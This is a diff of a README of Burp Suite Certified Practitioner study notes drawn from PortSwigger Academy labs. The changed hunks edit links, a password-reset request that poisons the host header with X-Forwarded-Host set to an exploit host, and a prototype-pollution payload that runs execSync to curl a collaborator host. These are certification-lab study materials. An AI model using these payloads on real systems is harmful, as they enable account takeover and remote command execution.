@@ -1,7 +1,7 @@
 
 # Burp Suite Certified Practitioner Exam Study  
 
->This is my study notes on 100 PortSwigger Academy labs that I used to pass the [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) Exam and obtained my BSCP qualification.  
+>This is my study notes on 100 PortSwigger Academy labs that I used to pass the [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) Exam and obtained my [BSCP qualification](https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8).  
 >Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) to get the original learning materials.  
 >I also found this PortSwigger advice on [Retaking your exam](https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam?tid=SNL7Q8oXE1mjUW1rSgswXSPIjhdLL5210Y-ogEuD1GZVp1w5spKfl5OJjAtj8AAC) very informative.  
   
@@ -1567,9 +1567,9 @@ Origin: https://TARGET.net
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-X-Forwarded-Host: exploit.exploit-server.net
-X-Host: exploit.exploit-server.net
-X-Forwarded-Server: exploit.exploit-server.net
+X-Forwarded-Host: EXPLOIT.net
+X-Host: EXPLOIT.net
+X-Forwarded-Server: EXPLOIT.net
 Referer: https://TARGET.net/refreshpassword
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
@@ -2845,7 +2845,7 @@ wrtz{{#with "s" as |string|}}
 ```JSON
 "__proto__": {
     "execArgv":[
-        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+        "--eval=require('child_process').execSync('curl https://COLLABORATOR.com')"
     ]
 }
 ```  
